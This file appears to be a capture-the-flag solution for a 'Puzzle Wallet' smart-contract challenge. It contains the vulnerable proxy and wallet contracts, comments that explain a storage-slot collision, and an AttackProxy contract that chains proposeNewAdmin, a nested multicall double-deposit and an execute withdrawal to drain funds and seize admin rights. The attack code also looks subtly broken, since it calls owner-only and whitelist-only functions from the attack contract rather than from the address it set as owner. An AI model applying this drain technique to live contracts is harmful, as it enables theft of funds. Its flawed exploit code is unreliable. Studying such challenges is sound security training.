// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) {
        admin = _admin;
    }

    modifier onlyAdmin {
        require(msg.sender == admin, "Caller is not the admin");
        _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
        require(address(this).balance == 0, "Contract balance is not 0");
        maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
        require(address(this).balance <= maxBalance, "Max balance reached");
        balances[msg.sender] += msg.value;
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success, ) = to.call{ value: value }(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}

// Need to claim admin of proxy to pass challenge
// Because the below code using Proxy Admin pattern, so order of variables stored in the blockchain makes sense
// pendingAdmin(Proxy) ~ owner(Implementation)
// admin(Proxy) ~ maxBalance(Implementation)
// So need to set your address to maxBalance(Implementation)
// -> need to use setMaxBalance
// -> 1. By pass balance check, that requires balance of this contract is 0
//    2. By pass onlyWhitelist check <- use addToWhitelist <- claim owner  <-  proxy proposeNewAdmin
// ->  1. Need to withdraw all balance (drain the balance) of this contract
// -> For example: contract has 0.1 ETH
// -> Only withdraw via `execute` function
// -> Cheat balance of current user and then do multicall for calling `deposit` multiple times in a single transaction

contract AttackProxy {
    PuzzleWallet wallet = PuzzleWallet(0xF6f6E1A22657CFf797bb71591FF81FE59ce2B630);
    PuzzleProxy px = PuzzleProxy(0xF6f6E1A22657CFf797bb71591FF81FE59ce2B630);

    function claimAdmin() external payable{
        // Step 1
        px.proposeNewAdmin(msg.sender);
        wallet.addToWhitelist(msg.sender);

        // Step 2
        bytes[] memory depositSelector = new bytes[](1);
        depositSelector[0] = abi.encodeWithSelector(wallet.deposit.selector);

        bytes[] memory nestedMulticall = new bytes[](2);
        nestedMulticall[0] = abi.encodeWithSelector(wallet.deposit.selector);
        nestedMulticall[1] = abi.encodeWithSelector(wallet.multicall.selector, depositSelector);

        wallet.multicall{value: 0.001 ether}(nestedMulticall);

        // Step 3
        wallet.execute(msg.sender, 0.002 ether, "");

        wallet.setMaxBalance(uint256(uint160(msg.sender)));
    }
}
